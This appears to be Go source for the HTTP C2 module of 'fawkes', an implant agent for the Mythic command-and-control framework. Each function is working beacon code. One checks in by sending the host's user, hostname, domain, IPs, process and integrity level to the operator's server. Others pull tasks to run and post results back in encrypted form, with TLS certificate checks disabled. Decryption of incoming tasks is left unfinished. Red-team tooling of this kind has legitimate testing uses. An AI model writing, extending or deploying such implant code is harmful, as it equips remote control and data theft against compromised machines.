package http

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"fawkes/pkg/structs"
)

// HTTPProfile handles HTTP communication with Mythic
type HTTPProfile struct {
	BaseURL       string
	UserAgent     string
	EncryptionKey string
	MaxRetries    int
	SleepInterval int
	Jitter        int
	Debug         bool
	Endpoint      string
	client        *http.Client
}

// NewHTTPProfile creates a new HTTP profile
func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, endpoint string) *HTTPProfile {
	profile := &HTTPProfile{
		BaseURL:       baseURL,
		UserAgent:     userAgent,
		EncryptionKey: encryptionKey,
		MaxRetries:    maxRetries,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		Endpoint:      endpoint,
	}

	// Create HTTP client with reasonable defaults
	profile.client = &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // For testing - should be configurable
			},
		},
	}

	return profile
}

// Checkin performs the initial checkin with Mythic
func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		InternalIP:   agent.InternalIP,
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
		PayloadType:  "fawkes",
		C2Profile:    "http",
	}

	if h.Debug {
		log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			log.Printf("[DEBUG] Checkin message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Send checkin request to configured endpoint
	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	if h.Debug {
		respBody, _ := io.ReadAll(resp.Body)
		log.Printf("[DEBUG] Checkin response: %s", string(respBody))
	}

	return nil
}

// GetTasking retrieves tasks from Mythic
func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: 1, // Request one task at a time for now
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			log.Printf("[DEBUG] Tasking message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
	if err != nil {
		return nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	if h.Debug {
		log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	if h.Debug {
		log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
	}

	// Decrypt if encryption key is provided
	if h.EncryptionKey != "" {
		// TODO: Implement decryption
	}

	if h.Debug {
		log.Printf("[DEBUG] Tasking response: %s", string(respBody))
	}

	// Parse the response - Mythic returns different formats
	// For now, assume it returns a JSON array of tasks
	var taskResponse map[string]interface{}
	if err := json.Unmarshal(respBody, &taskResponse); err != nil {
		// If not JSON, might be no tasks
		if h.Debug {
			log.Printf("[DEBUG] No JSON response, assuming no tasks")
		}
		return []structs.Task{}, nil
	}

	// Extract tasks from response
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.Task{
						ID:      getString(taskMap, "id"),
						Command: getString(taskMap, "command"),
						Params:  getString(taskMap, "parameters"),
					}
					tasks = append(tasks, task)
				}
			}
		}
	}

	return tasks, nil
}

// PostResponse sends a response back to Mythic
func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent) error {
	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal response message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			log.Printf("[DEBUG] Response message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
	if err != nil {
		return fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	if h.Debug {
		respBody, _ := io.ReadAll(resp.Body)
		log.Printf("[DEBUG] Post response result: %s", string(respBody))
	}

	return nil
}

// makeRequest is a helper function to make HTTP requests
func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
	url := h.BaseURL + path

	var reqBody io.Reader
	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	req, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set headers for Mythic C2
	req.Header.Set("User-Agent", h.UserAgent)
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Accept", "*/*")

	if h.Debug {
		log.Printf("[DEBUG] Making %s request to %s", method, url)
		log.Printf("[DEBUG] Request body: %s", string(body))
	}

	return h.client.Do(req)
}

// getString safely gets a string value from a map
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// encryptMessage encrypts a message exactly like Freyja's AesEncrypt
func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
	if h.EncryptionKey == "" {
		return msg
	}
	
	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
	if err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to decode encryption key: %v", err)
		}
		return msg
	}
	
	// Create AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to create AES cipher: %v", err)
		}
		return msg
	}
	
	// Generate random IV
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to generate IV: %v", err)
		}
		return msg
	}
	
	// Create CBC encrypter
	mode := cipher.NewCBCEncrypter(block, iv)
	
	// Pad the message to block size
	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		if h.Debug {
			log.Printf("[DEBUG] Failed to pad message: %v", err)
		}
		return msg
	}
	
	// Encrypt the message
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)
	
	// Freyja format: IV + Ciphertext
	ivCiphertext := append(iv, encrypted...)
	
	// Create HMAC of IV + Ciphertext
	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	hmacBytes := hmacHash.Sum(nil)
	
	// Freyja format: IV + Ciphertext + HMAC
	return append(ivCiphertext, hmacBytes...)
}

// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 {
		return nil, fmt.Errorf("invalid blocksize")
	}
	if data == nil || len(data) == 0 {
		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
	}
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...), nil
}